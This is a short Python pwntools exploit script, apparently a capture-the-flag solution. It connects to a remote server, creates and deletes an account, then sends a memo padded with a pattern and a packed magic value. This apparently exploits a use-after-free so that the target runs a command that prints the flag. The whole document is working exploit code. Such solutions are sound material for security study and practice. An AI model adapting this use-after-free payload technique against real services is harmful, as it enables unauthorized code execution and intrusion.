from pwn import *

# if(main_account && *((_DWORD *)main_account + 16) == 1801680230) { system("/bin/cat flag"); }

local = False
if local == True:
    SERVER = "127.0.0.1"
    PORT = 2323
else:
    SERVER = "88.198.233.174"
    PORT = 33807

r = remote(SERVER, PORT)

memo = "AABACADAEAFAGAHAIAJAKALAMANAOBBCBDBEBFBGBHBIBJBKBLBMBNBOCCDCECFC"
memo += p32(1801680230)

def create_acc(r, fname, lname):
    r.recvuntil(": ")
    r.send(fname)
    r.recvuntil(": ")
    r.send(lname)
    r.recvuntil(": ")

def delete_acc(r):
    r.send("3")
    r.recvuntil(": ")

def add_memo(r, memo):
    r.recvuntil(":")
    r.send(memo)
    r.recvuntil(": ")


r.recvline_contains("number")
create_acc(r, "just", "kms")
delete_acc(r)
add_memo(r, "")

print r.recvn(6)
